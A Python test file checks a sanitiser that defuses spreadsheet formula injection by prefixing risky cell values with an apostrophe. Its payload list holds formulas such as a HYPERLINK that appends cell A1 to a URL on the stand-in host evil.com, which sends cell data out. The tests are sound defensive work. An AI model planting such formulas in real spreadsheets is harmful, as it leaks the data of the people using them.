from services.sheets import _neutralize_formula


def test_neutralize_formula_prefixes_trigger_characters():
    payloads = [
        '=HYPERLINK("https://evil.com?x="&A1,"prize")',
        '=IMPORTXML("https://evil.com","//a")',
        "+1+1",
        "-1+1",
        "@SUM(A1)",
        "\ttabbed",
        "\rcarriage",
    ]
    for payload in payloads:
        result = _neutralize_formula(payload)
        assert result == "'" + payload, f"expected leading apostrophe for {payload!r}"
        assert result[0] == "'"


def test_neutralize_formula_leaves_safe_values_unchanged():
    safe = [
        "Priya Verma",
        "priya@example.com",
        "I want to join the club",
        "1st Year",
        "",
        "normal text with = in the middle",
    ]
    for value in safe:
        assert _neutralize_formula(value) == value


def test_neutralize_formula_ignores_non_strings():
    assert _neutralize_formula(None) is None
    assert _neutralize_formula(123) == 123